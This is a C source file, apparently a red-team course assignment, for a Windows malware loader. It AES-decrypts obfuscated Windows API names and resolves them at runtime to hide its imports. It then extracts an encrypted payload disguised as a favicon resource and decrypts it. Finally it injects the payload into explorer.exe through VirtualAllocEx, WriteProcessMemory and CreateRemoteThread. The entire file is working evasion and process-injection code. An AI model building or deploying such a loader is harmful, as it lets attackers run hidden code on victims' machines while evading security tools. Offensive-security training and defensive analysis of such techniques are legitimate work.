/*

 Red Team Operator course code template
 Assignment
 
 author: reenz0h (twitter: @sektor7net)
 modified by: geobour98

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include "resources.h"

FARPROC (WINAPI * pGetProcAddress) (
  HMODULE hModule,
  LPCSTR  lpProcName
);

HMODULE (WINAPI * pGetModuleHandleA) (
  LPCSTR lpModuleName
);

HRSRC (WINAPI * pFindResourceA) (
  HMODULE hModule,
  LPCSTR  lpName,
  LPCSTR  lpType
);

HGLOBAL (WINAPI * pLoadResource) (
  HMODULE hModule,
  HRSRC   hResInfo
);

LPVOID (WINAPI * pLockResource) (
  HGLOBAL hResData
);

DWORD (WINAPI * pSizeofResource) (
  HMODULE hMoodule,
  HRSRC hResInfo
);

LPVOID (WINAPI * pVirtualAlloc) (
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

VOID (WINAPI * pRtlMoveMemory) (
  VOID UNALIGNED *Destination,
  VOID UNALIGNED *Source,
  SIZE_T         Length
);

HANDLE (WINAPI * pCreateToolhelp32Snapshot) (
  DWORD dwFlags,
  DWORD th32ProcessID
);

BOOL (WINAPI * pProcess32First) (
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

BOOL (WINAPI * pProcess32Next) (
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

INT (WINAPI * plstrcmpiA) (
  LPCSTR lpString1,
  LPCSTR lpString2
);

BOOL (WINAPI * pCloseHandle) (
  HANDLE hObject
);

HANDLE (WINAPI * pOpenProcess) (
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);

LPVOID (WINAPI * pVirtualAllocEx)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

HANDLE (WINAPI * pCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);

DWORD (WINAPI * pWaitForSingleObject) (
  HANDLE hHandle,
  DWORD dwMilliseconds
);

// paste the output of aesencrypt.py
char key[] = { 0xfb, 0xc, 0x8a, 0x76, 0xec, 0x89, 0xf0, 0x91, 0x8d, 0xdd, 0x6, 0x16, 0xea, 0x9d, 0x74, 0x7f };
unsigned char skernel32[] = { 0xf3, 0xca, 0xa8, 0x1e, 0xf5, 0x19, 0xd2, 0xe8, 0x1e, 0x71, 0x47, 0xeb, 0xed, 0xd5, 0xf2, 0xc8 };
unsigned char sexplorer[] = { 0xcf, 0xca, 0x93, 0x5d, 0xd1, 0xcb, 0x32, 0x7f, 0x4a, 0x97, 0x43, 0x58, 0xf1, 0x8, 0xe6, 0x1f };
unsigned char sGetProcAddress[] = { 0xf4, 0x48, 0x22, 0x49, 0x10, 0x85, 0x4c, 0x68, 0x69, 0xa3, 0xec, 0x1a, 0xf9, 0x2b, 0x86, 0x36 };
unsigned char sGetModuleHandleA[] = { 0x6, 0xa2, 0xe9, 0x8f, 0x58, 0x14, 0x79, 0xa3, 0x9f, 0x75, 0x1c, 0x55, 0x3e, 0x49, 0xcc, 0x16, 0x59, 0x51, 0x48, 0x4b, 0x35, 0x0, 0x26, 0x69, 0xf5, 0x70, 0xe7, 0x83, 0x95, 0xca, 0xef, 0xf8 };
unsigned char sFindResourceA[] = { 0x37, 0xce, 0xe7, 0xc5, 0x65, 0xe9, 0x40, 0x7c, 0x8, 0xec, 0x4d, 0xd6, 0x7e, 0xde, 0x12, 0xc3 };
unsigned char sLoadResource[] = { 0xc1, 0xf, 0xe9, 0x28, 0x22, 0x8e, 0x6c, 0xca, 0x48, 0x65, 0x8d, 0x6f, 0x14, 0x4f, 0xda, 0x7a };
unsigned char sLockResource[] = { 0xbd, 0xce, 0xee, 0xdd, 0x92, 0x3a, 0xd, 0x87, 0x3b, 0x3b, 0xdb, 0x84, 0xcc, 0x33, 0x50, 0x39 };
unsigned char sSizeofResource[] = { 0x74, 0x50, 0x97, 0x80, 0x1a, 0x4e, 0x1c, 0xc9, 0x23, 0xed, 0x18, 0xae, 0x68, 0x95, 0x9d, 0x8c };
unsigned char sVirtualAlloc[] = { 0xb4, 0xf2, 0x24, 0x2, 0x9c, 0x25, 0xbf, 0x46, 0x1d, 0x95, 0xc6, 0x25, 0x68, 0xbd, 0x8a, 0xca };
unsigned char sRtlMoveMemory[] = { 0xf, 0x17, 0x62, 0x1e, 0xf5, 0x8, 0xcb, 0x6a, 0xf6, 0x33, 0x74, 0xb5, 0x3e, 0x43, 0xd6, 0x5e };
unsigned char sCreateToolhelp32Snapshot[] = { 0x92, 0xf3, 0xd8, 0x25, 0x41, 0xe1, 0xa0, 0x43, 0x44, 0x52, 0x46, 0xe3, 0x97, 0xd9, 0xc3, 0x50, 0x6e, 0x6c, 0x2f, 0x10, 0xd7, 0xe1, 0xd7, 0xc5, 0x9a, 0x69, 0x3a, 0x65, 0x2b, 0x8a, 0x2b, 0x41 };
unsigned char sProcess32First[] = { 0x1a, 0xc7, 0x91, 0xe9, 0x80, 0x53, 0x94, 0x35, 0x30, 0xd1, 0x7c, 0x8, 0x19, 0x7c, 0xe7, 0x6f };
unsigned char sProcess32Next[] = { 0xf5, 0x58, 0x5e, 0x2f, 0x71, 0x4c, 0x44, 0xf3, 0xeb, 0xb2, 0x57, 0x17, 0xfa, 0xa3, 0xf2, 0x71 };
unsigned char slstrcmpiA[] = { 0x59, 0x77, 0xf7, 0xbd, 0xd, 0xd2, 0x3f, 0xf4, 0xa9, 0x4c, 0xd, 0x32, 0x4d, 0x21, 0x6a, 0x44 };
unsigned char sCloseHandle[] = { 0xe2, 0x36, 0xc, 0x2c, 0x95, 0x71, 0x5f, 0xe0, 0xcb, 0x48, 0x9e, 0x85, 0xc6, 0x69, 0x55, 0xde };
unsigned char sOpenProcess[] = { 0x17, 0xd7, 0x8d, 0x6, 0x99, 0xa3, 0x63, 0xd, 0xdf, 0x91, 0xfb, 0x76, 0xc4, 0x8e, 0xff, 0xa8 };
unsigned char sVirtualAllocEx[] = { 0xea, 0x4d, 0x7a, 0xdb, 0xb8, 0x27, 0xa, 0x95, 0xdc, 0xf9, 0x15, 0x10, 0x3d, 0xe0, 0xd1, 0x3 };
unsigned char sWriteProcessMemory[] = { 0x93, 0xb5, 0x82, 0xbe, 0x15, 0x72, 0xd0, 0xdd, 0x50, 0x8e, 0x42, 0xab, 0xe0, 0xbe, 0x7d, 0x89, 0x48, 0xdd, 0xfc, 0x93, 0xd8, 0xc7, 0x2e, 0x90, 0xf0, 0x75, 0x1c, 0x9b, 0x41, 0xc9, 0x83, 0x8d };
unsigned char sCreateRemoteThread[] = { 0xad, 0x7e, 0x43, 0x43, 0x84, 0x31, 0x26, 0x4b, 0x82, 0xd0, 0x6b, 0x82, 0xf7, 0x32, 0x22, 0x11, 0xe8, 0xea, 0x57, 0xd5, 0x20, 0x52, 0x92, 0x36, 0xbd, 0x70, 0x2e, 0xd0, 0x27, 0x9f, 0x85, 0xdd };
unsigned char sWaitForSingleObject[] = { 0x4, 0xe4, 0xa3, 0x11, 0x76, 0x7e, 0xa7, 0x5, 0xc7, 0x1e, 0xac, 0x28, 0x80, 0x67, 0x23, 0x2b, 0xfe, 0xbb, 0xe9, 0xb9, 0x4b, 0xa8, 0x23, 0x5b, 0xeb, 0x1b, 0xba, 0xc, 0xcd, 0x37, 0x94, 0x9 };

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!pProcess32First(hProcSnap, &pe32)) {
                pCloseHandle(hProcSnap);
                return 0;
        }
                
        while (pProcess32Next(hProcSnap, &pe32)) {
                if (plstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        pCloseHandle(hProcSnap);
                
        return pid;
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;

		pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        
        hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                pWaitForSingleObject(hThread, 500);
                pCloseHandle(hThread);
                return 0;
        }
        return -1;
}

void AESDecryptString() {
	AESDecrypt((char *) skernel32, sizeof(skernel32), key, sizeof(key));
	AESDecrypt((char *) sexplorer, sizeof(sexplorer), key, sizeof(key));
	AESDecrypt((char *) sGetProcAddress, sizeof(sGetProcAddress), key, sizeof(key));
	AESDecrypt((char *) sGetModuleHandleA, sizeof(sGetModuleHandleA), key, sizeof(key));
	AESDecrypt((char *) sFindResourceA, sizeof(sFindResourceA), key, sizeof(key));
	AESDecrypt((char *) sLoadResource, sizeof(sLoadResource), key, sizeof(key));
	AESDecrypt((char *) sLockResource, sizeof(sLockResource), key, sizeof(key));
	AESDecrypt((char *) sSizeofResource, sizeof(sSizeofResource), key, sizeof(key));
	AESDecrypt((char *) sVirtualAlloc, sizeof(sVirtualAlloc), key, sizeof(key));
	AESDecrypt((char *) sRtlMoveMemory, sizeof(sRtlMoveMemory), key, sizeof(key));
	AESDecrypt((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), key, sizeof(key));
	AESDecrypt((char *) sProcess32First, sizeof(sProcess32First), key, sizeof(key));
	AESDecrypt((char *) sProcess32Next, sizeof(sProcess32Next), key, sizeof(key));
	AESDecrypt((char *) slstrcmpiA, sizeof(slstrcmpiA), key, sizeof(key));
	AESDecrypt((char *) sCloseHandle, sizeof(sCloseHandle), key, sizeof(key));
	AESDecrypt((char *) sOpenProcess, sizeof(sOpenProcess), key, sizeof(key));
	AESDecrypt((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
	AESDecrypt((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
	AESDecrypt((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
	AESDecrypt((char *) sWaitForSingleObject, sizeof(sWaitForSingleObject), key, sizeof(key));
}

void GetFunctionAddress() {
	pGetProcAddress = GetProcAddress(GetModuleHandle(skernel32), sGetProcAddress);
	pGetModuleHandleA = pGetProcAddress(GetModuleHandle(skernel32), sGetModuleHandleA);
	pFindResourceA = pGetProcAddress(pGetModuleHandleA(skernel32), sFindResourceA);
	pLoadResource = pGetProcAddress(pGetModuleHandleA(skernel32), sLoadResource);
	pLockResource = pGetProcAddress(pGetModuleHandleA(skernel32), sLockResource);
	pSizeofResource = pGetProcAddress(pGetModuleHandleA(skernel32), sSizeofResource);
	pVirtualAlloc = pGetProcAddress(pGetModuleHandleA(skernel32), sVirtualAlloc);
	pRtlMoveMemory = pGetProcAddress(pGetModuleHandleA(skernel32), sRtlMoveMemory);
	pCreateToolhelp32Snapshot = pGetProcAddress(pGetModuleHandleA(skernel32), sCreateToolhelp32Snapshot);
	pProcess32First = pGetProcAddress(pGetModuleHandleA(skernel32), sProcess32First);
	pProcess32Next = pGetProcAddress(pGetModuleHandleA(skernel32), sProcess32Next);
	plstrcmpiA = pGetProcAddress(pGetModuleHandleA(skernel32), slstrcmpiA);
	pCloseHandle = GetProcAddress(pGetModuleHandleA(skernel32), sCloseHandle);
	pOpenProcess = GetProcAddress(pGetModuleHandleA(skernel32), sOpenProcess);
	pVirtualAllocEx = pGetProcAddress(pGetModuleHandleA(skernel32), sVirtualAllocEx);
	pWriteProcessMemory = pGetProcAddress(pGetModuleHandleA(skernel32), sWriteProcessMemory);
	pCreateRemoteThread = pGetProcAddress(pGetModuleHandleA(skernel32), sCreateRemoteThread);
	pWaitForSingleObject = pGetProcAddress(pGetModuleHandleA(skernel32), sWaitForSingleObject);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;

	unsigned char * payload;
	unsigned int payload_len;
	
	int pid = 0;
    HANDLE hProc = NULL;
	
	AESDecryptString();
	GetFunctionAddress();
	
	// Extract payload from resources section
	res = pFindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = pLoadResource(NULL, res);
	payload = (char *) pLockResource(resHandle);
	payload_len = pSizeofResource(NULL, res);
	
	// Allocate memory for payload
	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to allocated buffer
	pRtlMoveMemory(exec_mem, payload, payload_len);

	// Decrypt payload
	AESDecrypt((char *) exec_mem, payload_len, key, sizeof(key));
	
	// injection process starts here
	pid = FindTarget(sexplorer);

	if (pid) {
		// try to open target process
		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
	
		if (hProc != NULL) {
			Inject(hProc, exec_mem, payload_len);
			pCloseHandle(hProc);
		}
	}

	return 0;
}
